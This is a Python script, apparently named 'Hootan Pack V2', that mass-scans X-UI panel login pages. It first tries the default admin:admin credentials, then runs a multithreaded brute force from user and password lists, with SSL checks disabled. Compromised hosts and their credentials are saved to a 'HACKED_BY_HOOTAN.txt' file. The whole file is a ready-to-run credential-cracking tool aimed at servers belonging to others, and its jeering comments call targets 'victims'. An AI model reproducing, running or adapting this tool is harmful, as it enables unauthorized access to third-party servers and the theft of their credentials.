# Hootan Pack - V2 - THE BEAST
# X-UI Scanner & Cracker - UNLEASHED

import requests
import concurrent.futures
import sys
import urllib3
import time

# Shut the hell up, SSL warnings.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    print("""
██╗  ██╗ ██████╗  ██████╗ ████████╗ █████╗ ██╗  ██╗    ██████╗  █████╗  ██████╗ ██╗  ██╗
██║  ██║██╔═══██╗██╔═══██╗╚══██╔══╝██╔══██╗██║  ██║    ██╔══██╗██╔══██╗██╔════╝ ██║ ██╔╝
███████║██║   ██║██║   ██║   ██║   ███████║███████║    ██████╔╝███████║██║  ██╗ █████╔╝ 
██╔══██║██║   ██║██║   ██║   ██║   ██╔══██║██╔══██║    ██╔═══╝ ██╔══██║██║  ╚██╗██╔═██╗ 
██║  ██║╚██████╔╝╚██████╔╝   ██║   ██║  ██║██║  ██║    ██║     ██║  ██║╚██████╔╝██║  ██╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
-------------------------------------------------------------------------------------
                ⚡ MASS FLASH X-UI SCANNER & CRACKER ⚡
""")

def read_list(filename):
    """Reads a file and returns a list of stripped lines."""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [x.strip() for x in f.readlines() if x.strip()]
    except FileNotFoundError:
        print(f"\n[!] F*CK! File '{filename}' not found!")
        sys.exit()

def format_target_url(target):
    """Makes sure the target URL is ready for penetration."""
    if not target.startswith("http"):
        target = "http://" + target
    
    if target.endswith('/login'):
        return target
    elif target.endswith('/'):
        return target + 'login'
    else:
        return target + '/login'

def check_credential(url_endpoint, user, password):
    """
    Tries to breach the target with one combo.
    Returns: "SUCCESS", "PANEL_FOUND", "FAILED"
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json, text/javascript, */*; q=0.01'
    }
    data = {'username': user, 'password': password}
    try:
        r = requests.post(url_endpoint, data=data, headers=headers, timeout=5, verify=False)
        if '"success":true' in r.text.lower():
            return "SUCCESS"
        else:
            return "PANEL_FOUND"
    except requests.exceptions.RequestException:
        return "FAILED"

def default_scan_mode():
    """Mode 1: Hunt for low-hanging fruit."""
    print("\n--[ Mode 1: Default Credentials Scan ]--")
    targets_file = input("📂 Gimme the Targets Filename (e.g., targets.txt): ").strip()
    targets_list = read_list(targets_file)
    print(f"\n[*] Loaded: {len(targets_list)} Targets")
    print("[*] Hunting for the idiots using: admin:admin")
    print("="*50)

    for i, target in enumerate(targets_list):
        print(f"\r[*] Hunting: {i+1}/{len(targets_list)} -> {target}", end="")
        login_url = format_target_url(target)
        status = check_credential(login_url, 'admin', 'admin')
        
        if status == "SUCCESS":
            print(f"\n[🔥🔥 BOOM] OWNED! -> {target} | admin:admin")
            with open("HACKED_BY_HOOTAN.txt", "a", encoding='utf-8') as f:
                f.write(f"{target} | admin:admin\n")
        elif status == "PANEL_FOUND":
            with open("Panels_Found.txt", "a", encoding='utf-8') as f:
                f.write(f"{target}\n")
    
    print("\n\n[✅] The hunt is over.")
    print("[+] Easy targets are in 'HACKED_BY_HOOTAN.txt'")
    print("[+] Tougher nuts to crack are in 'Panels_Found.txt'. Use Mode 2 on them.")


def bruteforce_mode():
    """Mode 2: Unleash the full power."""
    print("\n--[ Mode 2: Full Brute-Force Assault ]--")
    targets_file = input("📂 Targets Filename (e.g targets.txt): ").strip()
    user_file = input("📂 Users Filename (e.g users.txt): ").strip()
    pass_file = input("🔑 Pass Filename (e.g pass.txt): ").strip()
    
    targets_list = read_list(targets_file)
    users = read_list(user_file)
    passwords = read_list(pass_file)
    
    print(f"\n[*] Loaded: {len(targets_list)} Targets | {len(users)} Users | {len(passwords)} Passwords")
    print(f"[*] Total combinations per poor bastard: {len(users) * len(passwords)}")
    print("="*50)

    combos = [(u, p) for u in users for p in passwords]
    
    stop_current_target_flag = False

    def attack_worker(args):
        nonlocal stop_current_target_flag
        if stop_current_target_flag:
            return

        url_endpoint, user, password, parent_url = args
        status = check_credential(url_endpoint, user, password)
        
        if status == "SUCCESS":
            if not stop_current_target_flag:
                print(f"\n[🔥🔥 BOOM] HACKED! -> {parent_url} | {user}:{password}")
                with open("HACKED_BY_HOOTAN.txt", "a", encoding='utf-8') as f:
                    f.write(f"{parent_url} | {user}:{password}\n")
                stop_current_target_flag = True

    for i, target in enumerate(targets_list):
        print(f"\n[{i+1}/{len(targets_list)}] ATTACKING: {target}")
        login_url = format_target_url(target)
        
        tasks = [(login_url, u, p, target) for u, p in combos]
        
        stop_current_target_flag = False
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(attack_worker, tasks)
            
        if stop_current_target_flag:
            print("[+] Target OWNED! Moving to the next victim...")
        else:
            print("[-] This one's clean. Lame. Moving on...")

    print("\n[✅] All targets have been violated.")


def main():
    banner()
    while True:
        print("\nWhat's your poison?")
        print("  1. Default Scan (Quick & Dirty)")
        print("  2. Full Brute-Force (Heavy Artillery)")
        print("  3. Get Out")
        choice = input(">> Choose (1/2/3): ").strip()

        if choice == '1':
            default_scan_mode()
            break
        elif choice == '2':
            bruteforce_mode()
            break
        elif choice == '3':
            print("Running away? Coward.")
            break
        else:
            print("[!] Are you blind? Enter 1, 2, or 3.")


if __name__ == "__main__":
    main()


